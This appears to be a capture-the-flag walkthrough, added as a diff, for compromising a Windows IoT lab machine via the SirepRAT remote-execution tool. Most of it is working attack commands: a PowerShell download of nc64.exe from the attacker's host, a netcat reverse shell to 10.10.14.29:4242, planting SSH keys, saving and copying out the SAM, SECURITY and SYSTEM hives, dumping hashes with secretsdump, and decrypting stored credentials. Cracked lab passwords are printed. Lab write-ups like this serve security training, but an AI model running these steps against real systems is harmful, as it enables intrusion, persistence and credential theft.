@@ -1,0 +1,64 @@
+135/tcp – RPC
+5985/tcp – Not-WinRM
+8080/tcp – HTTP Device portal
+29817/tcp – WPCon
+29820/tcp – WPConProtocol2
+
+[+] WPCon RCE: https://github.com/SafeBreach-Labs/SirepRAT
+
+[*] Prepare:
+
+limitedeternity$ webserve
+limitedeternity$ nc -lvp 4242
+
+root@parrot# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c wmic os get osarchitecture" --v
+OSArchitecture                = 64-bit
+
+[+] Get a SYSTEM shell:
+
+root@parrot# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" --args " -nop -exec bypass -c \"iwr -Uri http://10.10.14.29:8000/nc64.exe -Outfile C:\Windows\Temp\nc64.exe\""
+
+root@parrot# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Windows\Temp\nc64.exe 10.10.14.29 4242 -e \"powershell -nop -exec bypass\""
+
+[*] Generate ssh keypair, then follow: https://www.concurrency.com/blog/may-2019/key-based-authentication-for-openssh-on-windows. Add your public key to $env:programdata\ssh\administrators_authorized_keys, set permissions. After that, add your public key to C:\Data\Users\app\authorized_keys.
+
+[*] Start SSH service:
+C:\Windows\System32\OpenSSH\sshd.exe
+
+[*] Note: you may want to try accessing flags at this point. But I'll proceed further.
+
+[+] Dump credentials (https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/):
+PS C:\Data\SystemData\Temp> reg save hklm\sam sam.save
+PS C:\Data\SystemData\Temp> reg save hklm\security security.save
+PS C:\Data\SystemData\Temp> reg save hklm\system system.save
+
+[+] Use SCP to fetch dumps:
+scp -i id_rsa administrator@10.10.10.204:/C:/Data/SystemData/Temp/sam.save ../loot/sam.save
+scp -i id_rsa administrator@10.10.10.204:/C:/Data/SystemData/Temp/security.save ../loot/security.save
+scp -i id_rsa administrator@10.10.10.204:/C:/Data/SystemData/Temp/system.save ../loot/system.save
+
+[+] Then:
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL > dump.txt
+
+[+] Cracked SAM hash for "app" using JTR:
+app:mesh5143
+
+[*] Connect via SSH.
+
+[*] Decrypt user.txt:
+
+$UserCred = Import-Clixml -Path .\user.txt
+$UserCred.GetNetworkCredential().password
+
+[+] Got user.txt!
+
+[*] Next:
+
+$UserCred = Import-Clixml -Path .\iot-admin.xml
+$UserCred.GetNetworkCredential().password
+
+[+] Password for omni\administrator: _1nt3rn37ofTh1nGz
+
+[*] Do the same thing as above.
+
+[+] Got root.txt!
